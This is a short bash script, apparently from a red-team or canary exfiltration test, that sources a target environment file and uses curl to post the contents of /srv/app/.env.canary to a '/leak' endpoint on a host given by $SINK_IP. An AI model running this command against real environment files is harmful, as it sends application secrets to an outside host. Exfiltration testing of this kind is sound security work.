#!/bin/bash
. /opt/rt/work/target.env
curl -s -m 5 --data-binary @/srv/app/.env.canary "http://$SINK_IP:8080/leak" || true
